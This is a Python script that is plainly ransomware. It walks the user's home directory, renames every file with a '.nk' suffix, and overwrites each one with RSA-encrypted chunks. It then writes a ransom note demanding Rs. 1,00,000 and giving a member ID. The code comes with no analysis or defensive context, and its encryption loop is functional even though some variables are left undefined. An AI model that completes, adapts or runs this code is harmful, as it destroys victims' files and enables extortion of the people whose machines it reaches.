import os
import rsa
import pickle

t = publicKey.split(', ')
n = int((t[0])[10:])
e = int((t[1])[:-1])

def encrypt():
    global publicKey

    partpath = os.path.expanduser('~') + "/"
    try:
        for dirpath, dirs, files in os.walk(partpath, topdown = True):
            dirpath = dirpath + "/"
            for filename in files:
                i = 0
                x = {}
                fname = dirpath + filename
                if filename != "e" + m_id + ".deb":
                    nfname = fname + ".nk"
                    os.rename(fname, nfname)
                    with open(nfname, 'rb') as f:
                        while True:
                            data = f.read(117)
                            if data:
                                ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
                                x[i] = ct
                                i += 1
                            else:
                                break
                    with open(nfname, 'wb') as f:
                        pickle.dump(x, f)
    except:
        pass

encrypt()
with open("nk_readme", 'w') as f:
    f.write("YOUR FILES ARE ENCRYPTED !!!\n")
    f.write("WANT TO GAIN ASSCESS AGAIN ?\n")
    f.write("CONTACT US AT '{EMAIL_ID}' WITH YOUR MEMBER ID\n")
    f.write("YOU WILL NEED TO PAY RS. 1,00,000 ONLY\n")
    f.write("MEMEBER ID : ")
    f.write(m_id)
    f.write("\n")
